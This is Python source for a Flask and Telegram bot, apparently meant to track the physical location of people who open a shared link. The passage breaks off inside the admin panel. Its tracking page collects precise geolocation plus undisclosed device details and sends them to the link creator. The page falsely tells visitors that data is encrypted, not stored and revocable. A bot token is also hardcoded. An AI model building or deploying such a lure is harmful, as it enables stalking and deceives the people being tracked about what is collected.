"""
بوت تتبع المواقع الآمن - Telegram Location Tracking Bot
مطور بواسطة: [اسمك]
رابط البوت: https://t.me/[اسم_البوت_بعد_التفعيل]
"""

from flask import Flask, request, jsonify, render_template_string
import telebot
import threading
import logging
import os
import secrets
import time
from datetime import datetime, timedelta
from geopy.geocoders import Nominatim

# ========== إعدادات التطبيق ==========# ========== إعدادات التطبيق ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== إعدادات البوت ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
bot = telebot.TeleBot(BOT_TOKEN)

# ========== إعدادات Webhook ==========
# استخدم متغير البيئة أو القيمة الافتراضية الجديدة
DOMAIN = os.environ.get('RENDER_DOMAIN', 'telegram-tracking-bot.onrender.com')
WEBHOOK_URL = f'https://{DOMAIN}/webhook'
# ========== تخزين البيانات ==========
tracking_links = {}
user_data = {}

# ========== قوالب HTML ==========

# صفحة الرئيسية
HOME_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📍 نظام التتبع الآمن</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 40px 20px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
            color: #667eea;
        }
        
        h1 {
            font-size: 2.5em;
            color: #2d3748;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 1.2em;
            color: #4a5568;
            margin-bottom: 30px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }
        
        .stat-box {
            background: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
            transition: transform 0.3s ease;
        }
        
        .stat-box:hover {
            transform: translateY(-5px);
        }
        
        .stat-icon {
            font-size: 40px;
            margin-bottom: 15px;
            color: #667eea;
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #2d3748;
            margin: 10px 0;
        }
        
        .stat-label {
            color: #4a5568;
            font-size: 0.9em;
        }
        
        .features {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            margin: 40px 0;
        }
        
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin-top: 30px;
        }
        
        .feature-card {
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
        }
        
        .feature-icon {
            font-size: 35px;
            margin-bottom: 15px;
            color: #48bb78;
        }
        
        .cta-section {
            text-align: center;
            padding: 50px 20px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            margin: 40px 0;
        }
        
        .btn {
            display: inline-block;
            padding: 15px 35px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1.1em;
            margin: 10px;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
        }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: white;
            margin-top: 50px;
        }
        
        @media (max-width: 768px) {
            .header {
                padding: 30px 15px;
            }
            
            h1 {
                font-size: 2em;
            }
            
            .stats {
                grid-template-columns: 1fr;
            }
            
            .feature-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <div class="logo">📍</div>
            <h1>نظام التتبع الآمن</h1>
            <p class="subtitle">حل متكامل لتتبع المواقع الجغرافية بكل أمان وخصوصية</p>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-icon">🤖</div>
                    <div class="stat-number">نشط</div>
                    <div class="stat-label">حالة البوت</div>
                </div>
                
                <div class="stat-box">
                    <div class="stat-icon">🔗</div>
                    <div class="stat-number">{{ active_links }}</div>
                    <div class="stat-label">روابط نشطة</div>
                </div>
                
                <div class="stat-box">
                    <div class="stat-icon">👥</div>
                    <div class="stat-number">{{ total_users }}</div>
                    <div class="stat-label">مستخدمين</div>
                </div>
                
                <div class="stat-box">
                    <div class="stat-icon">🕒</div>
                    <div class="stat-number">24h</div>
                    <div class="stat-label">صلاحية الروابط</div>
                </div>
            </div>
        </div>
        
        <!-- المميزات -->
        <div class="features">
            <h2 style="text-align: center; margin-bottom: 30px; color: #2d3748;">✨ مميزات النظام</h2>
            
            <div class="feature-grid">
                <div class="feature-card">
                    <div class="feature-icon">🔒</div>
                    <h3>أمان تام</h3>
                    <p>نظام تشفير متقدم لحماية بياناتك وخصوصيتك</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">⚡</div>
                    <h3>سرعة فائقة</h3>
                    <p>إشعارات فورية عند تحديد الموقع بدون تأخير</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">🔄</div>
                    <h3>تلقائي بالكامل</h3>
                    <p>روابط تنتهي تلقائياً بعد 24 ساعة</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">📱</div>
                    <h3>متجاوب</h3>
                    <p>يعمل على جميع الأجهزة والمتصفحات</p>
                </div>
            </div>
        </div>
        
        <!-- دعوة للعمل -->
        <div class="cta-section">
            <h2 style="margin-bottom: 20px; color: #2d3748;">🚀 ابدأ الآن!</h2>
            <p style="margin-bottom: 30px; color: #4a5568; font-size: 1.1em;">
                انضم إلى الآلاف الذين يستخدمون نظام التتبع الآمن
            </p>
            
            <div>
                <a href="https://t.me/{{ bot_username }}" class="btn" target="_blank">
                    🔗 فتح البوت على Telegram
                </a>
                <a href="/health" class="btn btn-secondary">
                    📊 فحص حالة الخادم
                </a>
            </div>
            
            <div style="margin-top: 30px;">
                <a href="/admin" class="btn" style="background: #718096; padding: 10px 20px; font-size: 0.9em;">
                    🔧 لوحة التحكم
                </a>
            </div>
        </div>
        
        <!-- التعليمات -->
        <div class="features" style="margin-top: 40px;">
            <h2 style="text-align: center; margin-bottom: 30px; color: #2d3748;">❓ كيف يعمل؟</h2>
            
            <div style="max-width: 800px; margin: 0 auto;">
                <div style="display: flex; align-items: center; margin-bottom: 25px; padding: 20px; background: #f7fafc; border-radius: 10px;">
                    <div style="font-size: 30px; margin-left: 20px; color: #667eea;">1️⃣</div>
                    <div>
                        <h4 style="margin-bottom: 5px;">إنشاء رابط التتبع</h4>
                        <p>أرسل /newlink في البوت لإنشاء رابط تتبع فريد</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; margin-bottom: 25px; padding: 20px; background: #f7fafc; border-radius: 10px;">
                    <div style="font-size: 30px; margin-left: 20px; color: #667eea;">2️⃣</div>
                    <div>
                        <h4 style="margin-bottom: 5px;">مشاركة الرابط</h4>
                        <p>شارك الرابط مع الشخص الذي تريد تتبع موقعه</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; margin-bottom: 25px; padding: 20px; background: #f7fafc; border-radius: 10px;">
                    <div style="font-size: 30px; margin-left: 20px; color: #667eea;">3️⃣</div>
                    <div>
                        <h4 style="margin-bottom: 5px;">الموافقة على الموقع</h4>
                        <p>عند فتح الرابط، يطلب الإذن للوصول إلى الموقع الجغرافي</p>
                    </div>
                </div>
                
                <div style="display: flex; align-items: center; padding: 20px; background: #f7fafc; border-radius: 10px;">
                    <div style="font-size: 30px; margin-left: 20px; color: #667eea;">4️⃣</div>
                    <div>
                        <h4 style="margin-bottom: 5px;">استقبال الإحداثيات</h4>
                        <p>تصلك إحداثيات الموقع فوراً على البوت مع خريطة تفاعلية</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- الفوتر -->
    <div class="footer">
        <p>© 2024 نظام التتبع الآمن. جميع الحقوق محفوظة.</p>
        <p style="margin-top: 10px; opacity: 0.8;">
            تم التطوير بـ ❤️ لتوفير حل آمن وموثوق
        </p>
    </div>
    
    <script>
        // تحديث الإحصائيات تلقائياً
        function updateStats() {
            fetch('/stats')
                .then(response => response.json())
                .then(data => {
                    document.querySelectorAll('.stat-number')[1].textContent = data.active_links;
                    document.querySelectorAll('.stat-number')[2].textContent = data.total_users;
                });
        }
        
        // تحديث كل 30 ثانية
        setInterval(updateStats, 30000);
        
        // تحديث عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', updateStats);
    </script>
</body>
</html>
'''

# صفحة التتبع
TRACKING_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب الوصول إلى الموقع</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 25px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .icon {
            font-size: 80px;
            margin-bottom: 25px;
            color: #667eea;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        h1 {
            color: #2d3748;
            margin-bottom: 20px;
            font-size: 28px;
            line-height: 1.4;
        }
        
        .tracking-id {
            background: #f7fafc;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            color: #2d3748;
            font-size: 14px;
            word-break: break-all;
            border: 2px dashed #cbd5e0;
        }
        
        .info-box {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            text-align: right;
        }
        
        .info-box p {
            color: #856404;
            line-height: 1.8;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        .features-list {
            text-align: right;
            margin: 25px 0;
            padding: 0 20px;
        }
        
        .features-list ul {
            list-style-type: none;
        }
        
        .features-list li {
            margin: 15px 0;
            color: #4a5568;
            line-height: 1.8;
            padding-right: 30px;
            position: relative;
            font-size: 15px;
        }
        
        .features-list li:before {
            content: "✓";
            color: #48bb78;
            position: absolute;
            right: 0;
            font-weight: bold;
            font-size: 18px;
        }
        
        .buttons {
            display: flex;
            gap: 15px;
            margin-top: 35px;
            flex-direction: column;
        }
        
        @media (min-width: 480px) {
            .buttons {
                flex-direction: row;
            }
        }
        
        .btn {
            flex: 1;
            padding: 20px;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            transition: all 0.3s ease;
            min-height: 65px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn-accept {
            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
            color: white;
        }
        
        .btn-decline {
            background: linear-gradient(135deg, #f56565 0%, #c53030 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }
        
        .btn:active {
            transform: translateY(-1px);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            margin: 25px 0;
            color: #48bb78;
            font-weight: bold;
            font-size: 16px;
        }
        
        .footer {
            margin-top: 40px;
            padding-top: 25px;
            border-top: 1px solid #e2e8f0;
            font-size: 13px;
            color: #718096;
        }
        
        .footer p {
            margin: 8px 0;
        }
        
        .progress-bar {
            width: 100%;
            height: 5px;
            background: #e2e8f0;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: width 3s ease-in-out;
        }
        
        .success-message {
            display: none;
            background: #c6f6d5;
            border: 2px solid #48bb78;
            color: #22543d;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- أيقونة -->
        <div class="icon">📍</div>
        
        <!-- العنوان -->
        <h1>طلب الوصول إلى الموقع الجغرافي</h1>
        
        <!-- معرف التتبع -->
        <div class="tracking-id">
            <strong>🆔 كود التتبع:</strong> <span id="trackingId">{{ tracking_id }}</span>
        </div>
        
        <!-- معلومات هامة -->
        <div class="info-box">
            <p>⚠️ <strong>تنبيه هام:</strong></p>
            <p>يطلب هذا التطبيق الوصول إلى موقعك الجغرافي الحالي</p>
            <p>🔒 سيتم استخدام معلومات موقعك للأغراض المحددة فقط</p>
            <p>📱 يرجى التأكد من تفعيل خدمة تحديد الموقع على جهازك</p>
        </div>
        
        <!-- المميزات -->
        <div class="features-list">
            <ul>
                <li>تشفير كامل لبيانات الموقع</li>
                <li>عدم تخزين أي معلومات شخصية</li>
                <li>إشعارات فورية عند تحديد الموقع</li>
                <li>إمكانية إلغاء الموافقة في أي وقت</li>
                <li>توافق مع جميع المتصفحات والأجهزة</li>
            </ul>
        </div>
        
        <!-- شريط التقدم -->
        <div class="progress-bar" id="progressBar">
            <div class="progress" id="progress"></div>
        </div>
        
        <!-- رسالة النجاح -->
        <div class="success-message" id="successMessage">
            ✅ <strong>تم بنجاح!</strong> تم إرسال الموقع بنجاح
        </div>
        
        <!-- مؤشر التحميل -->
        <div class="loading" id="loadingSpinner">
            ⏳ جاري تحديد الموقع الجغرافي...
        </div>
        
        <!-- الأزرار -->
        <div class="buttons">
            <button class="btn btn-accept" onclick="requestLocation()" id="acceptBtn">
                <span>✅</span> موافق ومتابعة
            </button>
            <button class="btn btn-decline" onclick="declineLocation()" id="declineBtn">
                <span>❌</span> رفض وإغلاق
            </button>
        </div>
        
        <!-- الفوتر -->
        <div class="footer">
            <p>🔐 جميع البيانات محمية بموجب سياسة الخصوصية</p>
            <p>📅 © 2024 نظام التتبع الآمن</p>
            <p>🕒 {{ current_time }}</p>
        </div>
    </div>

    <script>
        let isProcessing = false;
        
        function requestLocation() {
            if (isProcessing) return;
            
            isProcessing = true;
            const acceptBtn = document.getElementById('acceptBtn');
            const declineBtn = document.getElementById('declineBtn');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const progressBar = document.getElementById('progressBar');
            const progress = document.getElementById('progress');
            
            // تعطيل الأزرار
            acceptBtn.disabled = true;
            declineBtn.disabled = true;
            acceptBtn.innerHTML = '<span>⏳</span> جاري المعالجة...';
            
            // إظهار مؤشر التحميل
            loadingSpinner.style.display = 'block';
            progressBar.style.display = 'block';
            
            // بدء شريط التقدم
            setTimeout(() => {
                progress.style.width = '100%';
            }, 100);
            
            if (navigator.geolocation) {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    // عند النجاح
                    function(position) {
                        const data = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: {
                                width: screen.width,
                                height: screen.height
                            },
                            tracking_id: document.getElementById('trackingId').textContent
                        };
                        
                        // إرسال البيانات
                        sendLocationData(data);
                    },
                    // عند الفشل
                    function(error) {
                        let errorMessage = "تعذر الحصول على موقعك: ";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "❌ تم رفض الإذن للوصول إلى الموقع";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "📍 معلومات الموقع غير متاحة";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "⏰ انتهت المهلة. حاول مرة أخرى";
                                break;
                            default:
                                errorMessage = "⚠️ حدث خطأ غير متوقع";
                        }
                        
                        showError(errorMessage);
                        resetButtons();
                    },
                    options
                );
            } else {
                showError("المتصفح أو الجهاز لا يدعم تحديد الموقع الجغرافي");
                resetButtons();
            }
        }
        
        function sendLocationData(data) {
            fetch('/track', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'X-Tracking-ID': data.tracking_id
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('فشل في إرسال البيانات');
                }
                return response.json();
            })
            .then(result => {
                if (result.success) {
                    // إظهار رسالة النجاح
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('loadingSpinner').style.display = 'none';
                    
                    // إخفاء الأزرار
                    document.getElementById('acceptBtn').style.display = 'none';
                    document.getElementById('declineBtn').style.display = 'none';
                    
                    // تحديث الصفحة بعد 3 ثواني
                    setTimeout(() => {
                        document.body.innerHTML = `
                            <div class="container">
                                <div class="icon" style="color: #48bb78;">✅</div>
                                <h1 style="color: #48bb78;">تم بنجاح!</h1>
                                <p style="margin: 20px 0; color: #4a5568; font-size: 18px;">
                                    شكراً لموافقتك على مشاركة الموقع
                                </p>
                                <div style="background: #f7fafc; padding: 20px; border-radius: 10px; margin: 20px 0;">
                                    <p style="color: #2d3748; margin: 5px 0;">
                                        <strong>📍 خط العرض:</strong> ${data.latitude.toFixed(6)}
                                    </p>
                                    <p style="color: #2d3748; margin: 5px 0;">
                                        <strong>📍 خط الطول:</strong> ${data.longitude.toFixed(6)}
                                    </p>
                                    <p style="color: #2d3748; margin: 5px 0;">
                                        <strong>📏 الدقة:</strong> ${data.accuracy} متر
                                    </p>
                                </div>
                                <p style="color: #718096; margin-top: 30px;">
                                    يمكنك إغلاق هذه الصفحة الآن
                                </p>
                            </div>
                        `;
                    }, 3000);
                } else {
                    throw new Error(result.error || 'حدث خطأ في المعالجة');
                }
            })
            .catch(error => {
                showError('تعذر إرسال البيانات: ' + error.message);
                resetButtons();
            });
        }
        
        function declineLocation() {
            if (confirm("هل أنت متأكد من رفض مشاركة الموقع؟")) {
                document.body.innerHTML = `
                    <div class="container">
                        <div class="icon" style="color: #f56565;">❌</div>
                        <h1 style="color: #f56565;">تم رفض الطلب</h1>
                        <p style="margin: 20px 0; color: #4a5568; font-size: 18px;">
                            تم رفض طلب الوصول إلى الموقع
                        </p>
                        <p style="color: #718096;">
                            يمكنك إغلاق هذه الصفحة
                        </p>
                    </div>
                `;
            }
        }
        
        function showError(message) {
            alert(message);
        }
        
        function resetButtons() {
            isProcessing = false;
            const acceptBtn = document.getElementById('acceptBtn');
            const declineBtn = document.getElementById('declineBtn');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const progressBar = document.getElementById('progressBar');
            
            acceptBtn.disabled = false;
            declineBtn.disabled = false;
            acceptBtn.innerHTML = '<span>✅</span> موافق ومتابعة';
            loadingSpinner.style.display = 'none';
            progressBar.style.display = 'none';
            document.getElementById('progress').style.width = '0%';
        }
        
        // إضافة تأثيرات عند التحميل
        document.addEventListener('DOMContentLoaded', function() {
            console.log('صفحة التتبع جاهزة للكود:', document.getElementById('trackingId').textContent);
            
            // إضافة تأثيرات للزر الرئيسي
            const acceptBtn = document.getElementById('acceptBtn');
            acceptBtn.addEventListener('mouseenter', function() {
                this.style.transform = 'scale(1.05)';
            });
            
            acceptBtn.addEventListener('mouseleave', function() {
                this.style.transform = 'scale(1)';
            });
        });
    </script>
</body>
</html>
'''

# ========== الدوال المساعدة ==========

def get_address_from_coords(lat, lon):
    """الحصول على العنوان من الإحداثيات"""
    try:
        geolocator = Nominatim(user_agent="telegram_tracking_bot")
        location = geolocator.reverse(f"{lat}, {lon}", language='ar', timeout=10)
        return location.address if location else "موقع غير معروف"
    except Exception as e:
        logger.error(f"خطأ في الحصول على العنوان: {e}")
        return "لم يتم تحديد العنوان"

def create_tracking_link(chat_id, user_id):
    """إنشاء رابط تتبع جديد"""
    try:
        tracking_id = secrets.token_urlsafe(16)
        
        tracking_links[tracking_id] = {
            'chat_id': chat_id,
            'user_id': user_id,
            'created_at': datetime.now(),
            'expires_at': datetime.now() + timedelta(hours=24),
            'active': True,
            'visits': 0,
            'successful_tracks': 0
        }
        
        # حفظ بيانات المستخدم
        if user_id not in user_data:
            user_data[user_id] = {
                'total_links': 0,
                'active_links': 0,
                'created_at': datetime.now(),
                'last_activity': datetime.now()
            }
        
        user_data[user_id]['total_links'] += 1
        user_data[user_id]['active_links'] += 1
        user_data[user_id]['last_activity'] = datetime.now()
        
        tracking_url = f'https://{DOMAIN}/track/{tracking_id}'
        logger.info(f"تم إنشاء رابط تتبع: {tracking_id} للمستخدم: {user_id}")
        
        return tracking_url, tracking_id
        
    except Exception as e:
        logger.error(f"خطأ في إنشاء رابط التتبع: {e}")
        return None, None

def send_location_to_bot(chat_id, data):
    """إرسال بيانات الموقع إلى البوت"""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        accuracy = data.get('accuracy', 0)
        tracking_id = data.get('tracking_id', 'unknown')
        
        # الحصول على العنوان
        address = get_address_from_coords(lat, lon)
        
        # إنشاء رسالة الموقع
        message = f"""
📍 **تم تسجيل موقع جديد!**

**🆔 كود التتبع:** `{tracking_id}`
**📅 التاريخ:** {datetime.now().strftime("%Y/%m/%d")}
**🕒 الوقت:** {datetime.now().strftime("%I:%M:%S %p")}

**📍 الموقع:** {address}

**📊 الإحداثيات:**
• خط العرض: `{lat:.6f}`
• خط الطول: `{lon:.6f}`
• الدقة: `{accuracy:.1f}` متر

**🗺️ روابط الخرائط:**
• [Google Maps](https://maps.google.com/?q={lat},{lon})
• [OpenStreetMap](https://www.openstreetmap.org/?mlat={lat}&mlon={lon})

**🌐 معلومات الجهاز:**
• النظام: {data.get('platform', 'غير معروف')}
• اللغة: {data.get('language', 'غير معروف')}
• المتصفح: {data.get('userAgent', 'غير معروف')[:50]}

**🔗 رابط التتبع:** https://{DOMAIN}/track/{tracking_id}
        """
        
        # إرسال الرسالة
        bot.send_message(chat_id, message, parse_mode='Markdown')
        
        # إرسال خريطة مصغرة (اختياري)
        try:
            bot.send_location(chat_id, lat, lon)
        except:
            pass
        
        # تحديث الإحصائيات
        if tracking_id in tracking_links:
            tracking_links[tracking_id]['successful_tracks'] += 1
            user_id = tracking_links[tracking_id]['user_id']
            if user_id in user_data:
                user_data[user_id]['last_activity'] = datetime.now()
        
        logger.info(f"تم إرسال الموقع للمستخدم: {chat_id}")
        return True
        
    except Exception as e:
        logger.error(f"خطأ في إرسال الموقع: {e}")
        return False

# ========== مسارات الويب ==========

@app.route('/')
def home():
    """الصفحة الرئيسية"""
    active_links = sum(1 for link in tracking_links.values() if link['active'])
    total_users = len(user_data)
    
    page = HOME_PAGE.replace('{{ active_links }}', str(active_links))
    page = page.replace('{{ total_users }}', str(total_users))
    page = page.replace('{{ bot_username }}', 'your_bot_username_here')
    
    return page

@app.route('/health')
def health_check():
    """فحص صحة الخادم"""
    try:
        webhook_info = bot.get_webhook_info()
        active_links = sum(1 for link in tracking_links.values() if link['active'])
        
        return jsonify({
            'status': 'healthy',
            'timestamp': datetime.now().isoformat(),
            'service': 'telegram-tracking-bot',
            'version': '2.0.0',
            'active_links': active_links,
            'total_users': len(user_data),
            'webhook': {
                'url': webhook_info.url,
                'pending_updates': webhook_info.pending_update_count,
                'last_error': webhook_info.last_error_date,
                'max_connections': webhook_info.max_connections
            },
            'server': {
                'domain': DOMAIN,
                'uptime': round(time.time() - app_start_time, 2)
            }
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def get_stats():
    """الحصول على الإحصائيات"""
    active_links = sum(1 for link in tracking_links.values() if link['active'])
    total_tracks = sum(link.get('successful_tracks', 0) for link in tracking_links.values())
    
    return jsonify({
        'active_links': active_links,
        'total_links': len(tracking_links),
        'total_users': len(user_data),
        'total_tracks': total_tracks,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/setup')
def setup_webhook():
    """إعداد Webhook يدوياً"""
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=WEBHOOK_URL)
        
        return jsonify({
            'success': True,
            'message': '✅ تم إعداد Webhook بنجاح',
            'webhook_url': WEBHOOK_URL,
            'bot_username': bot.get_me().username
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    """استقبال تحديثات البوت"""
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = telebot.types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return '', 200
        except Exception as e:
            logger.error(f"خطأ في معالجة Webhook: {e}")
            return 'Internal Server Error', 500
    return 'Bad Request', 400

@app.route('/track/<tracking_id>')
def tracking_page(tracking_id):
    """صفحة التتبع"""
    try:
        if tracking_id in tracking_links:
            link_info = tracking_links[tracking_id]
            
            # التحقق من صلاحية الرابط
            if datetime.now() > link_info['expires_at']:
                link_info['active'] = False
                return '''
                <!DOCTYPE html>
                <html dir="rtl">
                <head>
                    <meta charset="UTF-8">
                    <title>انتهت الصلاحية</title>
                    <style>
                        body { font-family: Arial; text-align: center; padding: 50px; }
                        .error { color: #f56565; font-size: 24px; }
                    </style>
                </head>
                <body>
                    <h1 class="error">⏰ انتهت صلاحية الرابط</h1>
                    <p>رابط التتبع هذا لم يعد فعالاً</p>
                    <p>يرجى طلب رابط جديد من البوت</p>
                </body>
                </html>
                ''', 410
            
            # زيادة عدد الزيارات
            link_info['visits'] += 1
            
            # إعداد الصفحة
            current_time = datetime.now().strftime("%Y-%m-%d %I:%M %p")
            page = TRACKING_PAGE.replace('{{ tracking_id }}', tracking_id)
            page = page.replace('{{ current_time }}', current_time)
            
            logger.info(f"زيارة صفحة التتبع: {tracking_id}")
            return page
            
        return '''
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>رابط غير صالح</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
                .error { color: #f56565; font-size: 24px; }
            </style>
        </head>
        <body>
            <h1 class="error">❌ رابط غير صالح</h1>
            <p>رابط التتبع غير موجود</p>
            <p>يرجى التحقق من الرابط والمحاولة مرة أخرى</p>
        </body>
        </html>
        ''', 404
        
    except Exception as e:
        logger.error(f"خطأ في صفحة التتبع: {e}")
        return 'Internal Server Error', 500

@app.route('/track', methods=['POST'])
def handle_tracking():
    """معالجة بيانات التتبع"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'success': False, 'error': 'لم يتم توفير بيانات'}), 400
        
        tracking_id = data.get('tracking_id')
        
        if not tracking_id or tracking_id not in tracking_links:
            return jsonify({'success': False, 'error': 'كود تتبع غير صالح'}), 400
        
        link_info = tracking_links[tracking_id]
        
        # التحقق من صلاحية الرابط
        if datetime.now() > link_info['expires_at']:
            link_info['active'] = False
            return jsonify({'success': False, 'error': 'انتهت صلاحية الرابط'}), 410
        
        # التحقق من حالة الرابط
        if not link_info.get('active', True):
            return jsonify({'success': False, 'error': 'الرابط غير نشط'}), 403
        
        # إرسال البيانات إلى البوت
        success = send_location_to_bot(link_info['chat_id'], data)
        
        if success:
            logger.info(f"تم معالجة بيانات التتبع: {tracking_id}")
            return jsonify({
                'success': True,
                'message': 'تم إرسال الموقع بنجاح',
                'tracking_id': tracking_id,
                'timestamp': datetime.now().isoformat()
            })
        else:
            return jsonify({'success': False, 'error': 'فشل في إرسال البيانات'}), 500
            
    except Exception as e:
        logger.error(f"خطأ في معالجة التتبع: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/admin')
def admin_panel():
    """لوحة التحكم (مبسطة)"""
    active_links = sum(1 for link in tracking_links.values() if link['active'])
    total_tracks = sum(link.get('successful_tracks', 0) for link in tracking_links.values())
    
    return f'''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>لوحة التحكم</title>
        <style>
            body {{ font-family: Arial; padding: 20px; }}
            .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
            .stat-box {{ background: #f7fafc; padding: 20px; border-radius: 10px; text-align: center; }}
            .stat-number {{ font-size: 2em; font-weight: bold; color: #2d3748; }}
        </style>
    </head>
    <body>
        <h1>📊 لوحة التحكم</h1>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{len(tracking_links)}</div>
                <div>إجمالي الروابط</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{active_links}</div>
                <div>روابط نشطة</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{len(user_data)}</div>
                <div>مستخدمين</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{total_tracks}</div>
                <div>عمليات تتبع</div>
            </div>
        </div>
        
        <div style="margin-top: 30px;">
